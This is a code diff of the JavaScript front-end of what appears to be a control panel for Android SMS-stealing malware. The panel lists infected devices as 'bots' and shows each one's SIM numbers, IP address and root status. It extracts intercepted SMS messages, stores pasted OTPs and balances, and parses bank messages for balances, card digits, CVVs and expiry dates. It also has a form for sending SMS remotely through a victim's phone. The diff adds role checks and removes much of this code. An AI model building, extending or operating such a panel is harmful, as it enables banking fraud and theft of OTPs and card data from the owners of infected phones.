@@ -1295,8 +1295,8 @@ async function bootNexus() {
             const data = await res.json();
             if (data.success) {
                 window.CURRENT_ROLE = data.role;
-                window.CAN_EDIT_PHONE = data.permissions.canEditPhone;
-                window.CAN_VIEW_TELECOM = data.permissions.canViewTelecomIntel;
+                window.CAN_EDIT_PHONE = data.role === 'admin' || data.permissions?.canEditPhone;
+                window.CAN_VIEW_TELECOM = data.role === 'admin' || data.permissions?.canViewTelecomIntel;
             } else {
                 localStorage.removeItem('token');
                 location.reload();
@@ -1304,12 +1304,19 @@ async function bootNexus() {
             }
         }
         
-        // Hide Admin tabs if standard user
+        // Hide Admin tabs and features if standard user
         if (window.CURRENT_ROLE !== 'admin') {
             const dbBtn = document.getElementById('dbManagerBtn');
             const userBtn = document.getElementById('userManagerBtn');
             if (dbBtn) dbBtn.style.display = 'none';
             if (userBtn) userBtn.style.display = 'none';
+        }
+        
+        if (!window.CAN_EDIT_PHONE) {
+            const fEditMain = document.getElementById('filterEditMain');
+            const fEditBulk = document.getElementById('filterEditBulk');
+            if (fEditMain) fEditMain.style.display = 'none';
+            if (fEditBulk) fEditBulk.style.display = 'none';
         }
 
         renderDbSidebarFilters();
@@ -1375,787 +1382,7 @@ async function getAuthToken(src) {
     return null;
 }
 
-async function fetchAll(isBg = false) {
-    const l = document.getElementById('loader');
-    if (!isBg) {
-        document.getElementById('devList').innerHTML = renderSkeletons();
-        document.getElementById('devCount').textContent = 'DEVICES (···)';
-        
-        document.getElementById('hTotal').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
-        document.getElementById('hOnline').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
-        document.getElementById('hOffline').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
-        const ratioEl = document.getElementById('hRatio');
-        if(ratioEl) ratioEl.innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:10px;border-radius:4px;"></span>';
-        const barEl = document.getElementById('hProgressBar');
-        if(barEl) { barEl.style.width = '100%'; barEl.style.background = 'rgba(255,255,255,0.05)'; barEl.style.boxShadow = 'none'; }
-        
-        if (curTab === 'overview') {
-            document.getElementById('pane').innerHTML = renderMainSkeletons();
-        }
-    }
-    
-    let newDevices = [];
 
-    try {
-        const dbRes = await fetch('/api/databases', {
-            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
-        });
-        if (dbRes.ok) {
-            const dbResult = await dbRes.json();
-            if (dbResult.success) {
-                SOURCES = dbResult.data;
-            }
-        }
-
-        const res = await fetch('/api/devices', {
-            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
-        });
-        if (res.ok) {
-            const result = await res.json();
-            if (result.success) {
-                for (const info of result.data) {
-                    const id = info._id;
-                    const srcKey = info._src;
-                    
-                    if (isBg) {
-                        let existing = devices.find(d => d._id === id && d._src === srcKey);
-                        if (existing) {
-                            existing.status = info.status;
-                            existing.battery = info.battery;
-                            existing.webhookEvent = info.webhookEvent;
-                            
-                            const card = document.getElementById(`card-${srcKey}-${id}`);
-                            if (card) {
-                                const dot = card.querySelector('.d-status');
-                                if (dot) dot.className = `d-status ${existing.status?'on':'off'}`;
-                                const batt = card.querySelector('.d-batt');
-                                if (batt) {
-                                    const bnum = parseInt(existing.battery)||0;
-                                    batt.style.color = bnum>50?'var(--green)':bnum>20?'var(--amber)':'var(--red)';
-                                    batt.textContent = existing.battery||'—';
-                                }
-                            }
-                            if (selDev && selDev._id === existing._id && selDev._src === existing._src) {
-                                const root = document.documentElement;
-                                if (existing.status) {
-                                    root.style.setProperty('--accent', 'var(--cyan)');
-                                    root.style.setProperty('--accent-dim', 'var(--cyan-dim)');
-                                    root.style.setProperty('--accent-glow', '0 0 20px rgba(0, 240, 255, 0.4)');
-                                } else {
-                                    root.style.setProperty('--accent', 'var(--red)');
-                                    root.style.setProperty('--accent-dim', 'var(--red-dim)');
-                                    root.style.setProperty('--accent-glow', '0 0 20px rgba(239, 68, 68, 0.4)');
-                                }
-                                
-                                if (curTab === 'device') {
-                                    const dDot = document.getElementById('det-status-dot');
-                                    if (dDot) {
-                                        dDot.className = `d-status ${existing.status ? 'on' : 'off'}`;
-                                        dDot.title = existing.status ? 'Online' : 'Offline';
-                                    }
-                                    const dText = document.getElementById('det-status-text');
-                                    if (dText) {
-                                        dText.className = `d-val ${existing.status ? 'v-green' : 'v-red'}`;
-                                        dText.textContent = existing.status ? 'Online' : 'Offline';
-                                    }
-                                    const dBatt = document.getElementById('det-battery');
-                                    if (dBatt) {
-                                        dBatt.textContent = existing.battery || '—';
-                                    }
-                                }
-                            }
-                        } else {
-                            devices.push(info);
-                        }
-                    } else {
-                        newDevices.push(info);
-                    }
-                }
-            }
-        }
-    } catch(e) {
-        console.error("API fetch error:", e);
-    }
-    
-    if (!isBg) {
-        devices = newDevices;
-        devices.sort((a,b) => (b.status?1:0) - (a.status?1:0));
-        updateStats();
-        filterDevs();
-        renderTab();
-        l.classList.add('hidden');
-    } else {
-        updateStats(); // Only update the topbar stats silently
-        if (curTab === 'overview') renderTab(true); // Keep overview stats live during bg fetch (silently)
-    }
-}
-
-function updateStats() {
-    const total = devices.length;
-    const on = devices.filter(d=>d.status).length;
-    const off = total - on;
-    const ratio = total === 0 ? 0 : Math.round((on / total) * 100);
-    
-    document.getElementById('hTotal').textContent = total;
-    document.getElementById('hOnline').textContent = on;
-    document.getElementById('hOffline').textContent = off;
-    
-    const ratioEl = document.getElementById('hRatio');
-    if(ratioEl) ratioEl.textContent = ratio + '%';
-    const barEl = document.getElementById('hProgressBar');
-    if(barEl) {
-        barEl.style.width = ratio + '%';
-        if (ratio < 30 && total > 0) {
-            barEl.style.background = 'var(--red)';
-            barEl.style.boxShadow = '0 0 10px var(--red)';
-            if(ratioEl) ratioEl.style.color = 'var(--red)';
-        } else if (ratio < 70 && total > 0) {
-            barEl.style.background = 'var(--amber)';
-            barEl.style.boxShadow = '0 0 10px var(--amber)';
-            if(ratioEl) ratioEl.style.color = 'var(--amber)';
-        } else {
-            barEl.style.background = 'var(--cyan)';
-            barEl.style.boxShadow = '0 0 10px var(--cyan)';
-            if(ratioEl) ratioEl.style.color = 'var(--cyan)';
-        }
-    }
-}
-
-function setF(type, val, btn) {
-    if(type==='status') fStat = val; 
-    else if(type==='src') fSrc = val;
-    else if(type==='edit') fEdit = val;
-    
-    if (btn) {
-        btn.parentElement.querySelectorAll('.f-btn').forEach(b=>b.classList.remove('active'));
-        btn.classList.add('active');
-    }
-    filterDevs();
-}
-
-function filterDevs() {
-    const q = (document.getElementById('searchDev').value||'').toLowerCase();
-    filtered = devices.filter(d => {
-        if(fSrc !== 'all' && d._src !== fSrc) return false;
-        if(fStat === 'online' && !d.status) return false;
-        if(fStat === 'offline' && d.status) return false;
-        if(fStat === 'sms' && !d.webhookEvent?.sendSms) return false;
-        if(fEdit === 'edited' && !d.customPh) return false;
-        if(fEdit === 'original' && d.customPh) return false;
-        if(q) {
-            let p = d.sims?.map(s=>s?.phoneNumber).join(' ')||'';
-            let str = `${d._id} ${d.customPh||''} ${d.mobNo||''} ${d.modelName||''} ${d.ip_address||''} ${p}`.toLowerCase();
-            if(!str.includes(q)) return false;
-        }
-        return true;
-    });
-    document.getElementById('devCount').textContent = `DEVICES (${filtered.length})`;
-    renderDevList();
-}
-
-function renderSkeletons() {
-    let html = '';
-    for(let i=0; i<6; i++) {
-        html += `
-        <div style="padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.03); display: flex; align-items: center; gap: 14px;">
-            <div class="skel-block" style="width:36px; height:36px; border-radius:8px;"></div>
-            <div style="flex:1;">
-                <div class="skel-block" style="width:60%; height:14px; border-radius:4px; margin-bottom:8px;"></div>
-                <div class="skel-block" style="width:40%; height:10px; border-radius:4px;"></div>
-            </div>
-            <div>
-                <div class="skel-block" style="width:30px; height:14px; border-radius:4px; margin-bottom:8px; margin-left:auto;"></div>
-                <div class="skel-block" style="width:20px; height:20px; border-radius:4px; margin-left:auto;"></div>
-            </div>
-        </div>`;
-    }
-    return html;
-}
-
-function renderMainSkeletons() {
-    return `
-    <div class="stats-grid">
-        <div class="stat-card" style="border-color: rgba(255,255,255,0.05); min-height: 110px;">
-            <div class="skel-block" style="width: 40%; height: 12px; margin-bottom: 12px; border-radius: 4px;"></div>
-            <div class="skel-block" style="width: 60%; height: 40px; border-radius: 6px;"></div>
-        </div>
-        <div class="stat-card" style="border-color: rgba(255,255,255,0.05); min-height: 110px;">
-            <div class="skel-block" style="width: 40%; height: 12px; margin-bottom: 12px; border-radius: 4px;"></div>
-            <div class="skel-block" style="width: 60%; height: 40px; border-radius: 6px;"></div>
-        </div>
-        <div class="stat-card" style="border-color: rgba(255,255,255,0.05); min-height: 110px;">
-            <div class="skel-block" style="width: 40%; height: 12px; margin-bottom: 12px; border-radius: 4px;"></div>
-            <div class="skel-block" style="width: 60%; height: 40px; border-radius: 6px;"></div>
-        </div>
-    </div>
-    <div style="margin-top: 48px;">
-        <div class="skel-block" style="width: 200px; height: 24px; margin-bottom: 24px; border-radius: 4px;"></div>
-        <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 16px;">
-            ${Array(6).fill(0).map(() => `
-            <div class="hub-card" style="border-color: rgba(255,255,255,0.05); pointer-events: none; min-height: 80px;">
-                <div style="display: flex; flex-direction: column; gap: 6px; flex: 1.2;">
-                    <div style="display: flex; align-items: center; gap: 8px;">
-                        <div class="skel-block" style="width: 12px; height: 12px; border-radius: 50%;"></div>
-                        <div class="skel-block" style="width: 80px; height: 18px; border-radius: 4px;"></div>
-                    </div>
-                    <div class="skel-block" style="width: 120px; height: 10px; border-radius: 4px;"></div>
-                </div>
-                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 20px; border-left: 1px solid rgba(255,255,255,0.05); border-right: 1px solid rgba(255,255,255,0.05); min-width: 90px;">
-                    <div class="skel-block" style="width: 50px; height: 24px; border-radius: 4px; margin-bottom: 6px;"></div>
-                    <div class="skel-block" style="width: 60px; height: 8px; border-radius: 4px;"></div>
-                </div>
-                <div style="display: flex; flex-direction: column; justify-content: center; gap: 8px; flex: 1; padding-left: 8px;">
-                    <div style="display: flex; justify-content: space-between; align-items: flex-end;">
-                        <div class="skel-block" style="width: 40px; height: 10px; border-radius: 4px;"></div>
-                        <div class="skel-block" style="width: 24px; height: 16px; border-radius: 4px;"></div>
-                    </div>
-                    <div class="skel-block" style="width: 100%; height: 4px; border-radius: 2px;"></div>
-                </div>
-            </div>`).join('')}
-        </div>
-    </div>`;
-}
-
-function renderDevList() {
-    // Dynamic Threat Level Color Shift
-    const root = document.documentElement;
-    if (!selDev || selDev.status) {
-        root.style.setProperty('--accent', 'var(--cyan)');
-        root.style.setProperty('--accent-dim', 'var(--cyan-dim)');
-        root.style.setProperty('--accent-glow', '0 0 20px rgba(0, 240, 255, 0.4)');
-    } else {
-        root.style.setProperty('--accent', 'var(--red)');
-        root.style.setProperty('--accent-dim', 'var(--red-dim)');
-        root.style.setProperty('--accent-glow', '0 0 20px rgba(239, 68, 68, 0.4)');
-    }
-
-    const html = filtered.map((d, index) => {
-        const ph = d.customPh || d.mobNo || d.sims?.[0]?.phoneNumber || 'Unknown';
-        const act = selDev && selDev._id === d._id && selDev._src === d._src ? 'active' : '';
-        const bnum = parseInt(d.battery)||0;
-        const bcol = bnum>50?'var(--green)':bnum>20?'var(--amber)':'var(--red)';
-        
-        const sData = SOURCES.find(s => s.key === d._src);
-        const scol = sData ? sData.color : 'var(--cyan)';
-        
-        return `
-        <div class="device-card ${act}" id="card-${d._src}-${d._id}" onclick="select('${d._src}','${d._id}')" oncontextmenu="showContextMenu(event, '${d._src}', '${d._id}')">
-            <div class="d-icon">📱<div class="d-status ${d.status?'on':'off'}"></div></div>
-            <div class="d-info">
-                <div class="d-id">${esc(d._id)}</div>
-                <div class="d-sub">
-                    <span id="ph-${d._id}">${esc(ph)}</span>
-                    ${(CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;background:var(--cyan);color:#000;border-radius:3px;font-size:0.65rem;margin-left:4px;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
-                    ${ph !== 'Unknown' ? `<button class="d-copy" onclick="event.stopPropagation();copyToClip('${ph}', this)" title="Copy Number">📋</button>` : ''}
-                    ${CAN_EDIT_PHONE ? `<button class="d-edit list-edit-btn" onclick="event.stopPropagation();editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
-                </div>
-            </div>
-            <div class="d-meta">
-                <div class="d-batt" style="color:${bcol}">${esc(d.battery||'—')}</div>
-                <div class="d-src" style="color:${scol}; border-color:${scol}">${d._src[0].toUpperCase()}</div>
-            </div>
-        </div>`;
-    }).join('');
-    document.getElementById('devList').innerHTML = html;
-}
-
-function select(src, id) {
-    selDev = devices.find(d => d._id === id && d._src === src);
-    
-    renderDevList();
-    document.getElementById('mainContent').classList.add('mobile-active');
-    
-    if(curTab==='overview') {
-        document.querySelectorAll('.tab')[1].click(); // jump to device tab
-    } else {
-        renderTab();
-    }
-    fetchMsgs(selDev);
-}
-
-function closeMobilePane() {
-    document.getElementById('mainContent').classList.remove('mobile-active');
-    selDev = null;
-    
-    renderDevList();
-}
-
-async function fetchMsgs(d) {
-    const k = d._src+':'+d._id;
-    if(cache[k]) return;
-    try {
-        let r = await fetch(`/api/messages/${d._src}/${d._id}`, {
-            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
-        });
-        if (r.ok) {
-            let res = await r.json();
-            if (res.success && res.data && res.data.length > 0) {
-                // Ensure local IDs are attached for rendering
-                cache[k] = res.data.map(x => ({ ...x, _localId: Date.now()+Math.random() }));
-                if(curTab==='messages' || curTab==='finance') renderTab(); 
-                return;
-            }
-        }
-    } catch(e) {
-        console.error("Error fetching proxy messages", e);
-    }
-    cache[k] = [];
-    if(curTab==='messages' || curTab==='finance') renderTab();
-}
-
-function setTab(t, btn) {
-    curTab = t;
-    document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
-    btn.classList.add('active');
-    renderTab();
-}
-
-function renderTab(silent = false) {
-    const p = document.getElementById('pane');
-    if (!silent) {
-        p.classList.remove('animate-up'); void p.offsetWidth; p.classList.add('animate-up');
-    }
-    
-    if (curTab === 'overview') {
-        const on = devices.filter(d=>d.status).length;
-        const sms = devices.filter(d=>d.webhookEvent?.sendSms).length;
-        
-        let hubHtml = `<div style="margin-top: 48px; ${silent ? '' : 'animation: fadeUp 0.4s ease forwards;'}">
-            <h3 style="margin-bottom: 24px; font-size: 1.4rem; color: #fff; display: flex; align-items: center; gap: 10px; font-weight: 800; letter-spacing: 0.5px;">🌐 Hub Breakdown <span style="color:var(--text-sec); font-size: 0.9rem; font-weight: 600;">(${SOURCES.length} Attached Databases)</span></h3>
-            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 16px;">`;
-                
-        SOURCES.forEach(s => {
-            const sDevs = devices.filter(d => d._src === s.key);
-            const sOn = sDevs.filter(d => d.status).length;
-            const pct = devices.length ? Math.round((sDevs.length / devices.length) * 100) : 0;
-            const ratio = sDevs.length ? Math.round((sOn / sDevs.length) * 100) : 0;
-            
-            hubHtml += `
-            <div class="hub-card" onclick="selectDd('${s.key}', '${s.label}', 'src', null); if(window.innerWidth<=768) closeMobilePane();" oncontextmenu="showHubContextMenu(event, '${s.key}')">
-                <!-- Left Section: DB Info -->
-                <div style="display: flex; flex-direction: column; gap: 6px; flex: 1.2;">
-                    <div style="display: flex; align-items: center; gap: 8px;">
-                        <div style="width: 10px; height: 10px; border-radius: 50%; background: ${s.color}; box-shadow: 0 0 10px ${s.color};"></div>
-                        <div style="font-weight: 700; font-size: 1.1rem; color: #fff;">${esc(s.label)}</div>
-                    </div>
-                    <div style="font-size: 0.7rem; color: var(--text-muted); font-weight: 600; letter-spacing: 1px; text-transform: uppercase;">
-                        ${pct}% Payload Share
-                    </div>
-                </div>
-                
-                <!-- Middle Section: Total Bots -->
-                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 20px; border-left: 1px solid rgba(255,255,255,0.05); border-right: 1px solid rgba(255,255,255,0.05); min-width: 90px;">
-                    <div style="font-size: 1.6rem; font-weight: 800; color: #fff; font-family: var(--font-mono); line-height: 1;">${sDevs.length}</div>
-                    <div style="font-size: 0.65rem; color: var(--text-sec); text-transform: uppercase; letter-spacing: 1px; margin-top: 6px;">Devices</div>
-                </div>
-                
-                <!-- Right Section: Online & Bar -->
-                <div style="display: flex; flex-direction: column; justify-content: center; gap: 8px; flex: 1; padding-left: 8px;">
-                    <div style="display: flex; justify-content: space-between; align-items: flex-end;">
-                        <div style="font-size: 0.7rem; color: var(--text-sec); font-weight: 700; text-transform: uppercase; letter-spacing: 1px;">Online</div>
-                        <div style="font-size: 1.2rem; font-weight: 700; color: var(--green); font-family: var(--font-mono); line-height: 1;">${sOn}</div>
-                    </div>
-                    <div style="width: 100%; height: 4px; background: rgba(0,0,0,0.3); border-radius: 2px; overflow: hidden;">
-                        <div style="height: 100%; width: ${ratio}%; background: ${s.color}; border-radius: 2px; box-shadow: 0 0 8px ${s.color};"></div>
-                    </div>
-                </div>
-            </div>`;
-        });
-        
-        hubHtml += `</div></div>`;
-        
-        p.innerHTML = `
-        <div class="stats-grid">
-            <div class="stat-card c-cyan"><div class="stat-title">Total Devices</div><div class="stat-value">${devices.length}</div></div>
-            <div class="stat-card c-green"><div class="stat-title">Online</div><div class="stat-value">${on}</div></div>
-            <div class="stat-card c-red"><div class="stat-title">SMS Events</div><div class="stat-value">${sms}</div></div>
-        </div>
-        ${hubHtml}`;
-    }
-    else {
-        if(!selDev) { p.innerHTML = emp('Select a device from the sidebar'); return; }
-        const d = selDev;
-        
-        if (curTab === 'device') {
-            let sh = d.sims?.map((s,i)=>`<div class="detail-row"><span class="d-key">SIM ${i+1}</span>
-                <span class="d-val v-cyan" style="display:flex;align-items:center;gap:8px">
-                    ${esc(s.carrierName)} · ${esc(s.phoneNumber)}
-                    <button class="d-copy" style="opacity:1;position:relative" onclick="copyToClip('${s.phoneNumber}', this)">📋</button>
-                </span></div>`).join('')||'<div class="d-key">No SIM data</div>';
-            p.innerHTML = `
-            <div class="detail-grid">
-                <div class="detail-box">
-                    <h3>📱 Identity</h3>
-                    <div class="detail-row"><span class="d-key">Device ID</span><span class="d-val" style="display:flex;align-items:center;gap:8px">${esc(d._id)}<div id="det-status-dot" class="d-status ${d.status?'on':'off'}" style="position:relative; width:10px; height:10px; border:none; border-radius:50%;" title="${d.status?'Online':'Offline'}"></div></span></div>
-                    <div class="detail-row"><span class="d-key">Phone No.</span>
-                        <span class="d-val v-cyan" style="display:flex;align-items:center;gap:8px">
-                            ${esc(d.customPh || d.mobNo || 'Unknown')}
-                            ${(CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--cyan);color:#000;border-radius:4px;font-size:0.75rem;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
-                            ${CAN_EDIT_PHONE ? `<button class="d-edit" style="opacity:1;position:relative" onclick="editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
-                        </span>
-                    </div>
-                    <div class="detail-row"><span class="d-key">Model</span><span class="d-val">${esc(d.modelName)}</span></div>
-                    <div class="detail-row"><span class="d-key">Android OS</span><span class="d-val">${esc(d.androidV)}</span></div>
-                    <div class="detail-row"><span class="d-key">Status</span><span id="det-status-text" class="d-val ${d.status?'v-green':'v-red'}">${d.status?'Online':'Offline'}</span></div>
-                </div>
-                <div class="detail-box">
-                    <h3>📡 Network & Hardware</h3>
-                    <div class="detail-row"><span class="d-key">IP Address</span><span class="d-val v-amber">${esc(d.ip_address)}</span></div>
-                    <div class="detail-row"><span class="d-key">Carrier</span><span class="d-val">${esc(d.service_provider)}</span></div>
-                    <div class="detail-row"><span class="d-key">Battery</span><span id="det-battery" class="d-val">${esc(d.battery)}</span></div>
-                    <div class="detail-row"><span class="d-key">Rooted</span><span class="d-val ${d.isRoot?'v-red':''}">${d.isRoot?'Yes':'No'}</span></div>
-                </div>
-                <div class="detail-box">
-                    <h3>💳 Telecom & Financial</h3>
-                    ${sh}
-                </div>
-                <div class="detail-box">
-                    <h3>📝 OTP Notes</h3>
-                    <div style="font-size: 0.95rem; color: var(--text-sec); margin-bottom: 12px;" id="otpNoteContent">
-                        ${d.note ? esc(d.note) : '<span style="color:var(--text-muted);font-style:italic">No notes saved...</span>'}
-                    </div>
-                    <div style="display:flex;gap:8px;">
-                        <input type="text" id="otpNoteInput" placeholder="Paste OTP, balance..." style="flex:1;padding:8px 12px;border-radius:var(--radius-sm);background:var(--bg-panel);border:1px solid var(--border);color:var(--text-main);outline:none;">
-                        <button class="btn primary" onclick="saveOtpNote()">Save</button>
-                    </div>
-                </div>
-            </div>`;
-        }
-        else if (curTab === 'messages') {
-            const msgs = cache[d._src+':'+d._id];
-            if(!msgs) { 
-                p.innerHTML = `<div class="empty-state"><div class="spinner"></div><div>Extracting Messages...</div></div>`; 
-                fetchMsgs(selDev);
-                return; 
-            }
-            
-            p.innerHTML = `
-            <div class="msg-header-bar">
-                <div class="mhb-left">
-                    <div class="mhb-title">${esc(d._id)}</div>
-                    <div class="mhb-badge">${msgs.length} MSGS</div>
-                </div>
-                <div style="display:flex; gap:8px;">
-                    ${window.CAN_VIEW_TELECOM ? `<button class="btn" style="background:rgba(245, 158, 11, 0.1); color:var(--amber); border:1px solid rgba(245, 158, 11, 0.3);" onclick="scanTelecom(selDev)">📡 Auto-Discover Number</button>` : ''}
-                    <button class="btn primary" onclick="cache['${d._src}:${d._id}']=null;fetchMsgs(selDev)">↻ Force Sync</button>
-                </div>
-            </div>
-            <div class="msg-filters">
-                <input type="text" id="mSearch" placeholder="Search keywords, OTPs, senders..." oninput="renderMList()">
-                <button class="mf-btn ${mf==='all'?'active':''}" onclick="mf='all';renderTab()">All</button>
-                <button class="mf-btn ${mf==='in'?'active':''}" onclick="mf='in';renderTab()">Inbox</button>
-                <button class="mf-btn ${mf==='out'?'active':''}" onclick="mf='out';renderTab()">Sent</button>
-            </div>
-            <div class="chat-list" id="mList"></div>`;
-            renderMList();
-        }
-        else if (curTab === 'finance') {
-            const msgs = cache[d._src+':'+d._id];
-            if(!msgs) { 
-                p.innerHTML = `<div class="empty-state"><div class="spinner"></div><div>Extracting SMS Corpus for Financial Analysis...</div></div>`; 
-                fetchMsgs(selDev);
-                return; 
-            }
-            
-            // Run the Financial Intelligence Parser
-            const parsedBankMsgs = [];
-            let totalBal = 0;
-            let cardsFound = 0;
-            
-            msgs.forEach(m => {
-                const parsed = parseFinancialSms(m.message || m.body || '', m.sender || m.address || '');
-                if (parsed) {
-                    // 3-Month Date Filter
-                    const msgDateStr = m.dateTime || m.date || '';
-                    if (msgDateStr) {
-                        const msgDate = new Date(msgDateStr);
-                        const threeMonthsAgo = new Date();
-                        threeMonthsAgo.setMonth(threeMonthsAgo.getMonth() - 3);
-                        if (msgDate < threeMonthsAgo) return; // Skip if older than 3 months
-                    }
-
-                    parsed.rawMsg = m;
-                    parsedBankMsgs.push(parsed);
-                    if (parsed.isCardAlert && parsed.cardLast4) cardsFound++;
-                    
-                    // Simple logic to try and guess total liquid balance (takes highest recent balance from unique banks)
-                    if (parsed.availableBalance) {
-                        const balNum = parseFloat(parsed.availableBalance);
-                        if (!isNaN(balNum)) totalBal += balNum; // For demonstration, simple sum
-                    }
-                }
-            });
-            
-            if (parsedBankMsgs.length === 0) {
-                p.innerHTML = emp('No financial intelligence (Bank/Card data) detected in SMS logs.');
-                return;
-            }
-            
-            // Build the Financial Intelligence UI Dashboard
-            p.innerHTML = `
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; padding-bottom:16px; border-bottom:1px solid rgba(255,255,255,0.1);">
-                <div>
-                    <h3 style="font-size: 1.5rem; color: var(--text-main); font-weight: 800; display:flex; align-items:center; gap:10px;">
-                        💳 Financial Intelligence
-                    </h3>
-                    <div style="font-size: 0.85rem; color: var(--text-sec); margin-top: 4px;">Automated extraction of bank balances, transactions, and credit cards.</div>
-                </div>
-                <div style="display:flex; gap:16px;">
-                    <div style="background: rgba(0, 240, 255, 0.05); border: 1px solid rgba(0, 240, 255, 0.2); padding: 12px 20px; border-radius: var(--radius-sm); text-align:right;">
-                        <div style="font-size:0.7rem; font-weight:700; color:var(--cyan); letter-spacing:1px; text-transform:uppercase;">Extracted Events</div>
-                        <div style="font-size:1.4rem; font-family:var(--font-mono); font-weight:800; color:#fff;">${parsedBankMsgs.length}</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="chat-list" style="display:grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap:16px;">
-                ${parsedBankMsgs.map(data => {
-                    const isCredit = data.transactionType === 'credit';
-                    const isDebit = data.transactionType === 'debit';
-                    const amtColor = isCredit ? 'var(--green)' : isDebit ? 'var(--red)' : 'var(--text-main)';
-                    const amtPrefix = isCredit ? '+' : isDebit ? '-' : '';
-                    
-                    return `
-                    <div style="background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius-md); padding:16px; display:flex; flex-direction:column; gap:12px; transition:var(--trans);" onmouseover="this.style.borderColor='var(--cyan)'" onmouseout="this.style.borderColor='var(--border)'">
-                        <div style="display:flex; justify-content:space-between; align-items:flex-start;">
-                            <div style="display:flex; align-items:center; gap:8px;">
-                                <div style="width:32px; height:32px; border-radius:8px; background:var(--bg-panel); border:1px solid var(--border-light); display:flex; align-items:center; justify-content:center; font-size:1.2rem;">
-                                    ${data.isCardAlert ? '💳' : '🏦'}
-                                </div>
-                                <div>
-                                    <div style="font-weight:700; color:var(--text-main); font-size:1.1rem;">${esc(data.bankName)}</div>
-                                    <div style="font-size:0.75rem; color:var(--text-muted); font-family:var(--font-mono);">${esc(data.rawMsg.dateTime || data.rawMsg.date || '')}</div>
-                                </div>
-                            </div>
-                            <div style="text-align:right;">
-                                ${data.availableBalance ? `<div style="font-size:0.7rem; color:var(--text-sec); text-transform:uppercase; font-weight:700;">Avail. Balance</div><div style="font-family:var(--font-mono); font-weight:800; color:var(--cyan); font-size:1.1rem;">₹${esc(data.availableBalance)}</div>` : ''}
-                            </div>
-                        </div>
-                        
-                        <div style="display:flex; flex-wrap:wrap; gap:8px; background:rgba(0,0,0,0.2); padding:12px; border-radius:var(--radius-sm); border:1px solid rgba(255,255,255,0.02);">
-                            ${data.transactionAmount ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Transaction</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:${amtColor};">${amtPrefix}₹${esc(data.transactionAmount)}</div></div>` : ''}
-                            ${data.accountLast4 ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">A/C Last 4</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--text-main);">*${esc(data.accountLast4)}</div></div>` : ''}
-                            ${data.cardType ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Card Type</div><div style="font-weight:700; font-size:0.95rem; color:var(--text-main);">${esc(data.cardType)}</div></div>` : ''}
-                            ${data.cardLast4 ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Card Last 4</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--text-main);">*${esc(data.cardLast4)}</div></div>` : ''}
-                            ${data.cvv ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">CVV Found</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--amber);">${esc(data.cvv)}</div></div>` : ''}
-                            ${data.expiry ? `<div style="flex:1;"><div style="font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; font-weight:700; margin-bottom:2px;">Expiry Found</div><div style="font-family:var(--font-mono); font-weight:700; font-size:0.95rem; color:var(--amber);">${esc(data.expiry)}</div></div>` : ''}
-                        </div>
-                        
-                        <div style="margin-top:auto; font-size:0.85rem; color:var(--text-sec); line-height:1.4; border-top:1px dashed rgba(255,255,255,0.1); padding-top:12px;">
-                            ${esc(data.rawMsg.message || data.rawMsg.body || '')}
-                        </div>
-                    </div>
-                    `;
-                }).join('')}
-            </div>`;
-        }
-        else if (curTab === 'sendsms') {
-            p.innerHTML = `
-            <div class="form-panel">
-                <div class="form-title">Remote SMS Execution</div>
-                <div class="form-sub">Device: <span style="color:var(--cyan);font-family:var(--font-mono);font-weight:700;">${esc(d._id)}</span></div>
-                
-                <div class="sim-grid">
-                    <div class="sim-card ${selSim===1?'active':''}" onclick="selSim=1;renderTab()">
-                        <div class="sim-title">SIM 1</div>
-                        <div class="sim-num">${esc(d.sims?.[0]?.phoneNumber||'Unknown')}</div>
-                    </div>
-                    <div class="sim-card ${selSim===2?'active':''}" onclick="selSim=2;renderTab()">
-                        <div class="sim-title">SIM 2</div>
-                        <div class="sim-num">${esc(d.sims?.[1]?.phoneNumber||'Unknown')}</div>
-                    </div>
-                </div>
-
-                <div class="f-group">
-                    <label class="f-label">Device Phone Number</label>
-                    <input type="text" class="f-input" id="smsTo" placeholder="+91...">
-                </div>
-                
-                <div class="f-group">
-                    <label class="f-label">Payload Message (Uses <span style="color:var(--cyan)">[ID]</span> placeholder)</label>
